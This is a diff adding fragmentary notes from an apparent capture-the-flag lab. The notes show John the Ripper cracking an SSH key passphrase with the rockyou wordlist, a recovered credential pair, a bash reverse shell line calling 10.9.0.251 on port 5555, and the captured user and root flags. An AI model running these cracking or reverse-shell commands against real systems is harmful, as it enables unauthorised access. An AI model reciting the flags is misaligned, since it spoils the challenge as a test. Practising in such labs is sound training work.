@@ -1,0 +1,36 @@
+Since you keep forgetting your password, James, I've set up SSH keys for you.
+
+If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
+Also, we really need to talk about this "Military Grade" encryption. - Paradox
+
+
+john rsa.txt --wordlist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+james13          (id_rsa)     
+1g 0:00:00:00 DONE (2025-03-07 08:57) 7.142g/s 96000p/s 96000c/s 96000C/s pink25..waiting
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+Hack the machine and get the flag in user.txt
+
+i got flag: thm{65c1aaf000506e56996822c6281e6bf7}
+
+
+,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
+
+][{"name":"System","pass":"saydrawnlyingpicture"]
+
+10.9.0.251
+
+#!/bin/bash
+            
+bash -i >& /dev/tcp/10.9.0.251/5555 0>&1
+
+Escalate your privileges and get the flag in root.txt
+
+thm{7f336f8c359dbac18d54fdd64ea753bb}
